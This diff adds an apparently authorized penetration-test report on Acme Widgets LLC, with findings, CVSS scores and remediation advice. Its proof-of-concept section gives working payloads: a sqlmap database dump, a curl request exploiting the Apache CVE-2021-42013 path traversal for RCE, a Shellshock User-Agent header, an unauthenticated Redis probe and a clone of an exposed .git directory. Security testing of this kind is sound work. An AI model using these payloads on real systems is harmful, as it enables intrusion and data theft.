@@ -1,0 +1,702 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Acme Widgets LLC - Technical Report</title>
+<style>
+  :root {
+    --fg:#1a1a1a; --bg:#ffffff; --muted:#5b6570; --rule:#d8dee4;
+    --crit:#7d1128; --high:#c02a1b; --med:#b7791f; --low:#2b6cb0; --info:#4a5568;
+    --accent:#0aa1dd;
+  }
+  @media print { a { color: inherit; text-decoration: none; } body { font-size: 10.5pt; } }
+  * { box-sizing: border-box; }
+  body {
+    font: 15px/1.62 -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    color: var(--fg); background: var(--bg); margin: 0;
+    padding: 2.4rem clamp(1rem, 5vw, 4rem);
+    max-width: 60rem; margin-inline: auto;
+  }
+  .brandbar {
+    display: flex; align-items: center; gap: 1rem;
+    border-bottom: 2px solid var(--accent); padding-bottom: .8rem; margin-bottom: 1.6rem;
+  }
+  .brandbar img { max-height: 44px; width: auto; }
+  .brandbar .co { font-weight: 700; font-size: 1.05rem; }
+  .brandbar .tag { color: var(--muted); font-size: .85rem; }
+  .brandbar .cls {
+    margin-left: auto; font-size: .7rem; letter-spacing: .12em; font-weight: 700;
+    color: var(--crit); border: 1px solid var(--crit); border-radius: 4px; padding: .15rem .5rem;
+  }
+  h1, h2, h3, h4 { line-height: 1.25; font-weight: 650; }
+  h1 { font-size: 1.9rem; border-bottom: 3px solid var(--accent); padding-bottom: .4rem; }
+  h2 { font-size: 1.35rem; margin-top: 2.4rem; border-bottom: 1px solid var(--rule); padding-bottom: .25rem; }
+  h3 { font-size: 1.08rem; margin-top: 1.8rem; }
+  h4 { font-size: .98rem; color: var(--muted); }
+  code, pre { font-family: "SFMono-Regular", "JetBrains Mono", Consolas, monospace; font-size: .86em; }
+  pre {
+    background: #f6f8fa; border: 1px solid var(--rule); border-radius: 6px;
+    padding: .8rem 1rem; overflow-x: auto; white-space: pre-wrap; word-break: break-word;
+  }
+  code { background: #f0f2f4; padding: .1em .35em; border-radius: 4px; }
+  pre code { background: none; padding: 0; }
+  table { border-collapse: collapse; width: 100%; margin: 1rem 0; font-size: .92em; }
+  th, td { border: 1px solid var(--rule); padding: .45rem .6rem; text-align: left; vertical-align: top; }
+  th { background: #f4f6f8; font-weight: 600; }
+  blockquote {
+    margin: 1rem 0; padding: .4rem 1rem; border-left: 3px solid var(--accent);
+    background: #faf5ff; color: #44337a;
+  }
+  a { color: var(--low); }
+  .toc { background: #f6f8fa; border: 1px solid var(--rule); border-radius: 6px; padding: .5rem 1rem; }
+  hr { border: none; border-top: 1px solid var(--rule); margin: 2rem 0; }
+  footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid var(--rule);
+           color: var(--muted); font-size: .8rem; }
+</style>
+</head>
+<body>
+<div class="brandbar">
+  <div>
+<div class="co">Ronin Security Consulting</div><div class="tag">Offensive security assessments</div>  </div>
+<div class="cls">CONFIDENTIAL</div></div>
+<h1 id="acme-widgets-llc-technical-report">Acme Widgets LLC — Technical Report</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Prepared by</strong></td>
+<td>Ronin Security Consulting — CONFIDENTIAL</td>
+</tr>
+<tr>
+<td><strong>Engagement</strong></td>
+<td><code>acme-ext-2026q3</code></td>
+</tr>
+<tr>
+<td><strong>Client</strong></td>
+<td>Acme Widgets LLC</td>
+</tr>
+<tr>
+<td><strong>Tester</strong></td>
+<td>raven</td>
+</tr>
+<tr>
+<td><strong>Authorized by</strong></td>
+<td>J. Okafor, CTO</td>
+</tr>
+<tr>
+<td><strong>Testing window</strong></td>
+<td>2026-09-01 to 2026-09-30</td>
+</tr>
+<tr>
+<td><strong>Report generated</strong></td>
+<td>2026-09-09 23:46</td>
+</tr>
+<tr>
+<td><strong>Overall risk rating</strong></td>
+<td><strong>Critical</strong></td>
+</tr>
+<tr>
+<td><strong>Findings</strong></td>
+<td>9 total — 2 critical, 2 high, 1 medium, 2 low, 2 info</td>
+</tr>
+</tbody>
+</table>
+<p><em>Prepared by Ronin Security Consulting under NDA. Client distribution only.</em></p>
+<hr />
+<h2 id="reading-this-report">Reading this report</h2>
+<p>This is the engineer-level document. Every finding includes the affected asset,
+severity and CVSS v3.1 score/vector, the raw evidence, and — where the issue is
+exploitable — a copy-paste reproduction in section 3. Commands and raw tool
+output are reproduced verbatim so your team can validate each item independently.</p>
+<div class="toc">
+<ul>
+<li><a href="#acme-widgets-llc-technical-report">Acme Widgets LLC — Technical Report</a><ul>
+<li><a href="#reading-this-report">Reading this report</a></li>
+<li><a href="#1-scope-methodology">1. Scope &amp; Methodology</a><ul>
+<li><a href="#11-scope">1.1 Scope</a></li>
+<li><a href="#12-methodology">1.2 Methodology</a></li>
+</ul>
+</li>
+<li><a href="#2-vulnerability-details-the-findings">2. Vulnerability Details — The Findings</a><ul>
+<li><a href="#21-sql-injection-in-get-parameter-id-mysql">2.1 SQL injection in GET parameter 'id' (MySQL)</a></li>
+<li><a href="#22-apache-2449-path-traversal-rce-cve-2021-42013">2.2 Apache 2.4.49 Path Traversal / RCE (CVE-2021-42013)</a></li>
+<li><a href="#23-open-port-6379tcp-redis-internet-facing">2.3 Open port 6379/tcp - Redis (internet-facing)</a></li>
+<li><a href="#24-nikto-shellshock-rce-may-be-possible-via-cgi-binstatuscgi">2.4 nikto: Shellshock RCE may be possible via /cgi-bin/status.cgi</a></li>
+<li><a href="#25-exposed-git-repository-at-git">2.5 Exposed Git repository at /.git/</a></li>
+<li><a href="#26-tls-10-and-3des-ciphers-offered">2.6 TLS 1.0 and 3DES ciphers offered</a></li>
+<li><a href="#27-no-content-security-policy-httpsappacmeexample">2.7 No Content-Security-Policy (https://app.acme.example)</a></li>
+<li><a href="#28-subdomain-discovered-stagingacmeexample">2.8 Subdomain discovered: staging.acme.example</a></li>
+<li><a href="#29-open-port-3306tcp-mysql-mysql-8031">2.9 Open port 3306/tcp - mysql (MySQL 8.0.31)</a></li>
+</ul>
+</li>
+<li><a href="#3-proof-of-concept-poc-attack-paths">3. Proof of Concept (PoC) &amp; Attack Paths</a><ul>
+<li><a href="#31-sql-injection-in-get-parameter-id-mysql-httpsappacmeexampleitemid1">3.1 SQL injection in GET parameter 'id' (MySQL) — https://app.acme.example/item?id=1</a></li>
+<li><a href="#32-apache-2449-path-traversal-rce-cve-2021-42013-httpsappacmeexample">3.2 Apache 2.4.49 Path Traversal / RCE (CVE-2021-42013) — https://app.acme.example</a></li>
+<li><a href="#33-open-port-6379tcp-redis-internet-facing-2030113106379tcp">3.3 Open port 6379/tcp - Redis (internet-facing) — 203.0.113.10:6379/tcp</a></li>
+<li><a href="#34-nikto-shellshock-rce-may-be-possible-via-cgi-binstatuscgi-httpslegacyacmeexamplecgi-binstatuscgi">3.4 nikto: Shellshock RCE may be possible via /cgi-bin/status.cgi — https://legacy.acme.example/cgi-bin/status.cgi</a></li>
+<li><a href="#35-exposed-git-repository-at-git-httpsappacmeexamplegithead">3.5 Exposed Git repository at /.git/ — https://app.acme.example/.git/HEAD</a></li>
+</ul>
+</li>
+<li><a href="#4-remediation-recommendations">4. Remediation Recommendations</a><ul>
+<li><a href="#41-sql-injection-in-get-parameter-id-mysql">4.1 SQL injection in GET parameter 'id' (MySQL)</a></li>
+<li><a href="#42-apache-2449-path-traversal-rce-cve-2021-42013">4.2 Apache 2.4.49 Path Traversal / RCE (CVE-2021-42013)</a></li>
+<li><a href="#43-open-port-6379tcp-redis-internet-facing">4.3 Open port 6379/tcp - Redis (internet-facing)</a></li>
+<li><a href="#44-nikto-shellshock-rce-may-be-possible-via-cgi-binstatuscgi">4.4 nikto: Shellshock RCE may be possible via /cgi-bin/status.cgi</a></li>
+<li><a href="#45-exposed-git-repository-at-git">4.5 Exposed Git repository at /.git/</a></li>
+<li><a href="#46-tls-10-and-3des-ciphers-offered">4.6 TLS 1.0 and 3DES ciphers offered</a></li>
+<li><a href="#47-no-content-security-policy-httpsappacmeexample">4.7 No Content-Security-Policy (https://app.acme.example)</a></li>
+</ul>
+</li>
+<li><a href="#appendix-a-evidence-index">Appendix A — Evidence index</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<h2 id="1-scope-methodology">1. Scope &amp; Methodology</h2>
+<h3 id="11-scope">1.1 Scope</h3>
+<p><strong>In scope</strong></p>
+<ul>
+<li><code>*.acme.example</code></li>
+<li><code>203.0.113.0/28</code></li>
+</ul>
+<p><strong>Explicitly out of scope</strong></p>
+<ul>
+<li><code>mail.acme.example</code></li>
+</ul>
+<p>Testing window: 2026-09-01 to 2026-09-30.</p>
+<p><strong>Rules of engagement</strong></p>
+<blockquote>
+<p>External black-box. No DoS. No social engineering. Credential attacks only
+outside 09:00-17:00 local. Report any pre-existing compromise immediately.</p>
+</blockquote>
+<h3 id="12-methodology">1.2 Methodology</h3>
+<p>Each step below was executed from the tester's host against in-scope targets.
+Raw output for every run is retained under <code>engagements/acme-ext-2026q3/evidence/</code>.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Tool</th>
+<th>Target</th>
+<th>Started</th>
+<th>Duration</th>
+<th>Status</th>
+<th>Findings</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>subfinder</td>
+<td><code>acme.example</code></td>
+<td>2026-09-09 09:00</td>
+<td>7m00s</td>
+<td>ok</td>
+<td>1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>naabu</td>
+<td><code>203.0.113.10</code></td>
+<td>2026-09-09 09:09</td>
+<td>7m00s</td>
+<td>ok</td>
+<td>1</td>
+</tr>
+<tr>
+<td>3</td>
+<td>nmap</td>
+<td><code>203.0.113.10</code></td>
+<td>2026-09-09 09:18</td>
+<td>7m00s</td>
+<td>ok</td>
+<td>1</td>
+</tr>
+<tr>
+<td>4</td>
+<td>nuclei</td>
+<td><code>https://app.acme.example</code></td>
+<td>2026-09-09 09:27</td>
+<td>7m00s</td>
+<td>ok</td>
+<td>3</td>
+</tr>
+<tr>
+<td>5</td>
+<td>feroxbuster</td>
+<td><code>https://app.acme.example</code></td>
+<td>2026-09-09 09:36</td>
+<td>7m00s</td>
+<td>ok</td>
+<td>1</td>
+</tr>
+<tr>
+<td>6</td>
+<td>sqlmap</td>
+<td><code>https://app.acme.example/item?id=1</code></td>
+<td>2026-09-09 09:45</td>
+<td>7m00s</td>
+<td>ok</td>
+<td>1</td>
+</tr>
+<tr>
+<td>7</td>
+<td>nikto</td>
+<td><code>https://legacy.acme.example</code></td>
+<td>2026-09-09 09:54</td>
+<td>7m00s</td>
+<td>ok</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Exact commands</strong></p>
+<pre><code>subfinder acme.example
+</code></pre>
+<pre><code>naabu 203.0.113.10
+</code></pre>
+<pre><code>nmap 203.0.113.10
+</code></pre>
+<pre><code>nuclei https://app.acme.example
+</code></pre>
+<pre><code>feroxbuster https://app.acme.example
+</code></pre>
+<pre><code>sqlmap https://app.acme.example/item?id=1
+</code></pre>
+<pre><code>nikto https://legacy.acme.example
+</code></pre>
+<hr />
+<h2 id="2-vulnerability-details-the-findings">2. Vulnerability Details — The Findings</h2>
+<p>9 findings, ordered by severity then CVSS. Informational items are
+inventory/context and are retained for completeness.</p>
+<h3 id="21-sql-injection-in-get-parameter-id-mysql">2.1 SQL injection in GET parameter 'id' (MySQL)</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>CRITICAL</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>9.8 (<code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>)</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>https://app.acme.example/item?id=1</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>sqlmap / firm</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-89</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>sqlmap, sqli, get</td>
+</tr>
+</tbody>
+</table>
+<p>sqlmap confirmed boolean-based and UNION SQL injection via the id parameter; back-end is MySQL 8.0.</p>
+<p><strong>Evidence</strong></p>
+<pre><code>Parameter: id (GET)
+  Type: UNION query
+  Payload: id=1 UNION ALL SELECT NULL,CONCAT(user(),0x3a,version()),NULL-- -
+</code></pre>
+<h3 id="22-apache-2449-path-traversal-rce-cve-2021-42013">2.2 Apache 2.4.49 Path Traversal / RCE (CVE-2021-42013)</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>CRITICAL</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>9.8 (<code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>)</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>https://app.acme.example</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>nuclei / firm</td>
+</tr>
+<tr>
+<td><strong>CVE</strong></td>
+<td>CVE-2021-42013</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-22</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>nuclei, cve, rce</td>
+</tr>
+</tbody>
+</table>
+<p>Apache httpd 2.4.49/2.4.50 unauthenticated path traversal; with mod_cgi enabled this is remote code execution.</p>
+<p><strong>Request</strong></p>
+<pre><code class="language-http">POST /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1
+Host: app.acme.example
+
+echo; id
+</code></pre>
+<p><strong>Response (truncated)</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+
+uid=1(daemon) gid=1(daemon)
+</code></pre>
+<h3 id="23-open-port-6379tcp-redis-internet-facing">2.3 Open port 6379/tcp - Redis (internet-facing)</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>not scored</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>203.0.113.10:6379/tcp</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>naabu / confirmed</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-306</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>naabu, port, redis</td>
+</tr>
+</tbody>
+</table>
+<p>naabu found Redis exposed on the perimeter address. Redis defaults to no authentication.</p>
+<h3 id="24-nikto-shellshock-rce-may-be-possible-via-cgi-binstatuscgi">2.4 nikto: Shellshock RCE may be possible via /cgi-bin/status.cgi</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>not scored</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>https://legacy.acme.example/cgi-bin/status.cgi</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>nikto / tentative</td>
+</tr>
+<tr>
+<td><strong>CVE</strong></td>
+<td>CVE-2014-6271</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-78</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>nikto</td>
+</tr>
+</tbody>
+</table>
+<p>nikto flagged a CGI endpoint potentially vulnerable to Shellshock (CVE-2014-6271).</p>
+<h3 id="25-exposed-git-repository-at-git">2.5 Exposed Git repository at /.git/</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>MEDIUM</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>not scored</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>https://app.acme.example/.git/HEAD</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>feroxbuster / confirmed</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-538</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>feroxbuster, content-discovery</td>
+</tr>
+</tbody>
+</table>
+<p>feroxbuster: /.git/HEAD -&gt; 200. The working tree is downloadable.</p>
+<h3 id="26-tls-10-and-3des-ciphers-offered">2.6 TLS 1.0 and 3DES ciphers offered</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>LOW</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>not scored</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>app.acme.example:443</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>testssl / firm</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>testssl, tls</td>
+</tr>
+</tbody>
+</table>
+<p>TLS 1.0 enabled; CBC 3DES suites negotiable.</p>
+<h3 id="27-no-content-security-policy-httpsappacmeexample">2.7 No Content-Security-Policy (https://app.acme.example)</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>LOW</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>not scored</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>https://app.acme.example</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>httpx / firm</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-693</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>httpx, headers</td>
+</tr>
+</tbody>
+</table>
+<p>Response lacks a CSP header.</p>
+<h3 id="28-subdomain-discovered-stagingacmeexample">2.8 Subdomain discovered: staging.acme.example</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>INFO</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>not scored</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>staging.acme.example</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>subfinder / firm</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>subfinder, recon, subdomain</td>
+</tr>
+</tbody>
+</table>
+<p>Enumerated from crt.sh; resolves to 203.0.113.12.</p>
+<h3 id="29-open-port-3306tcp-mysql-mysql-8031">2.9 Open port 3306/tcp - mysql (MySQL 8.0.31)</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>INFO</td>
+</tr>
+<tr>
+<td><strong>CVSS v3.1</strong></td>
+<td>not scored</td>
+</tr>
+<tr>
+<td><strong>Affected</strong></td>
+<td><code>203.0.113.10:3306/tcp</code></td>
+</tr>
+<tr>
+<td><strong>Source / confidence</strong></td>
+<td>nmap / confirmed</td>
+</tr>
+<tr>
+<td><strong>Tags</strong></td>
+<td>nmap, service, mysql</td>
+</tr>
+</tbody>
+</table>
+<p>MySQL reachable from the testing host on the perimeter address.</p>
+<hr />
+<h2 id="3-proof-of-concept-poc-attack-paths">3. Proof of Concept (PoC) &amp; Attack Paths</h2>
+<h3 id="31-sql-injection-in-get-parameter-id-mysql-httpsappacmeexampleitemid1">3.1 SQL injection in GET parameter 'id' (MySQL) — <code>https://app.acme.example/item?id=1</code></h3>
+<p><strong>Attack path.</strong> Full DB read: dump customers + password hashes -&gt; offline crack -&gt; account takeover / admin. Stacked queries may allow RCE on the DB host.</p>
+<p><strong>Reproduce.</strong></p>
+<pre><code class="language-bash">sqlmap -u 'https://app.acme.example/item?id=1' --batch --dbs
+</code></pre>
+<h3 id="32-apache-2449-path-traversal-rce-cve-2021-42013-httpsappacmeexample">3.2 Apache 2.4.49 Path Traversal / RCE (CVE-2021-42013) — <code>https://app.acme.example</code></h3>
+<p><strong>Attack path.</strong> Unauthenticated RCE as the web user -&gt; pivot into 203.0.113.0/28. Public exploit exists.</p>
+<p><strong>Reproduce.</strong></p>
+<pre><code class="language-bash">curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' 'https://app.acme.example/cgi-bin/.%2e/.%2e/.%2e/bin/sh'
+</code></pre>
+<h3 id="33-open-port-6379tcp-redis-internet-facing-2030113106379tcp">3.3 Open port 6379/tcp - Redis (internet-facing) — <code>203.0.113.10:6379/tcp</code></h3>
+<p><strong>Attack path.</strong> Unauthenticated Redis -&gt; read/alter cached data, write a webshell or SSH key via CONFIG SET, or gain RCE on the Redis host.</p>
+<p><strong>Reproduce.</strong></p>
+<pre><code class="language-bash">redis-cli -h 203.0.113.10 -p 6379 INFO
+</code></pre>
+<h3 id="34-nikto-shellshock-rce-may-be-possible-via-cgi-binstatuscgi-httpslegacyacmeexamplecgi-binstatuscgi">3.4 nikto: Shellshock RCE may be possible via /cgi-bin/status.cgi — <code>https://legacy.acme.example/cgi-bin/status.cgi</code></h3>
+<p><strong>Attack path.</strong> If confirmed, unauthenticated RCE on a legacy host - likely an unmonitored pivot point.</p>
+<p><strong>Reproduce.</strong></p>
+<pre><code class="language-bash">curl -H 'User-Agent: () { :; }; echo; /bin/id' https://legacy.acme.example/cgi-bin/status.cgi
+</code></pre>
+<h3 id="35-exposed-git-repository-at-git-httpsappacmeexamplegithead">3.5 Exposed Git repository at /.git/ — <code>https://app.acme.example/.git/HEAD</code></h3>
+<p><strong>Attack path.</strong> Reconstruct source + committed secrets -&gt; authenticated access / more vulns.</p>
+<p><strong>Reproduce.</strong></p>
+<pre><code class="language-bash">git clone https://app.acme.example/.git recovered &amp;&amp; git -C recovered log --oneline | head
+</code></pre>
+<hr />
+<h2 id="4-remediation-recommendations">4. Remediation Recommendations</h2>
+<p>Per-finding remediation. Items are ordered by severity.</p>
+<h3 id="41-sql-injection-in-get-parameter-id-mysql">4.1 SQL injection in GET parameter 'id' (MySQL)</h3>
+<ul>
+<li><strong>Asset(s):</strong> <code>https://app.acme.example/item?id=1</code></li>
+<li><strong>Risk:</strong> CRITICAL (CVSS 9.8)- <strong>Fix:</strong> Parameterise every query (prepared statements). Least-privilege DB account. Add a WAF rule as an interim control. Retest with the same sqlmap command.</li>
+<li><strong>Effort:</strong> Medium-High &nbsp;•&nbsp; <strong>Suggested SLA:</strong> 7 days</li>
+<li><strong>References:</strong> https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</li>
+</ul>
+<h3 id="42-apache-2449-path-traversal-rce-cve-2021-42013">4.2 Apache 2.4.49 Path Traversal / RCE (CVE-2021-42013)</h3>
+<ul>
+<li><strong>Asset(s):</strong> <code>https://app.acme.example</code></li>
+<li><strong>Risk:</strong> CRITICAL (CVSS 9.8)- <strong>Fix:</strong> Upgrade Apache httpd to &gt;= 2.4.51. Disable mod_cgi/mod_cgid if unused. Restrict /cgi-bin.</li>
+<li><strong>Effort:</strong> Medium-High &nbsp;•&nbsp; <strong>Suggested SLA:</strong> 7 days</li>
+<li><strong>References:</strong> https://httpd.apache.org/security/vulnerabilities_24.html</li>
+</ul>
+<h3 id="43-open-port-6379tcp-redis-internet-facing">4.3 Open port 6379/tcp - Redis (internet-facing)</h3>
+<ul>
+<li><strong>Asset(s):</strong> <code>203.0.113.10:6379/tcp</code></li>
+<li><strong>Risk:</strong> HIGH- <strong>Fix:</strong> Bind Redis to localhost or an internal VLAN, require AUTH + TLS, and rename/disable CONFIG. Never expose 6379 to the internet.</li>
+<li><strong>Effort:</strong> Medium-High &nbsp;•&nbsp; <strong>Suggested SLA:</strong> 30 days</li>
+</ul>
+<h3 id="44-nikto-shellshock-rce-may-be-possible-via-cgi-binstatuscgi">4.4 nikto: Shellshock RCE may be possible via /cgi-bin/status.cgi</h3>
+<ul>
+<li><strong>Asset(s):</strong> <code>https://legacy.acme.example/cgi-bin/status.cgi</code></li>
+<li><strong>Risk:</strong> HIGH- <strong>Fix:</strong> Patch bash; retire the legacy CGI host or place it behind authentication and WAF.</li>
+<li><strong>Effort:</strong> Medium-High &nbsp;•&nbsp; <strong>Suggested SLA:</strong> 30 days</li>
+<li><strong>References:</strong> https://nvd.nist.gov/vuln/detail/CVE-2014-6271</li>
+</ul>
+<h3 id="45-exposed-git-repository-at-git">4.5 Exposed Git repository at /.git/</h3>
+<ul>
+<li><strong>Asset(s):</strong> <code>https://app.acme.example/.git/HEAD</code></li>
+<li><strong>Risk:</strong> MEDIUM- <strong>Fix:</strong> Deny /.git at the edge; deploy from a build artifact, not a checkout.</li>
+<li><strong>Effort:</strong> Low &nbsp;•&nbsp; <strong>Suggested SLA:</strong> 90 days</li>
+</ul>
+<h3 id="46-tls-10-and-3des-ciphers-offered">4.6 TLS 1.0 and 3DES ciphers offered</h3>
+<ul>
+<li><strong>Asset(s):</strong> <code>app.acme.example:443</code></li>
+<li><strong>Risk:</strong> LOW- <strong>Fix:</strong> Mozilla Intermediate profile: TLS 1.2+ only, drop 3DES/RC4/EXPORT, ECDHE key exchange.</li>
+<li><strong>Effort:</strong> Low &nbsp;•&nbsp; <strong>Suggested SLA:</strong> 180 days</li>
+<li><strong>References:</strong> https://ssl-config.mozilla.org/</li>
+</ul>
+<h3 id="47-no-content-security-policy-httpsappacmeexample">4.7 No Content-Security-Policy (https://app.acme.example)</h3>
+<ul>
+<li><strong>Asset(s):</strong> <code>https://app.acme.example</code></li>
+<li><strong>Risk:</strong> LOW- <strong>Fix:</strong> Define a restrictive CSP to limit script/style/frame sources.</li>
+<li><strong>Effort:</strong> Low &nbsp;•&nbsp; <strong>Suggested SLA:</strong> 180 days</li>
+</ul>
+<hr />
+<h2 id="appendix-a-evidence-index">Appendix A — Evidence index</h2>
+<p>Raw output for every run in this report is retained here:</p>
+<pre><code>engagements/acme-ext-2026q3/evidence/&lt;run-id&gt;/
+    command.txt      exact argv
+    stdout.log       full stdout
+    stderr.log       full stderr
+    &lt;tool&gt;.&lt;ext&gt;     machine-readable result (xml / jsonl / json)
+    findings.json    normalized findings extracted from this run
+</code></pre>
+<p>Audit trail (scope decisions + every command) is in <code>audit.log</code> at the project
+root.</p>
+<footer>Prepared by Ronin Security Consulting under NDA. Client distribution only.</footer></body>
+</html>
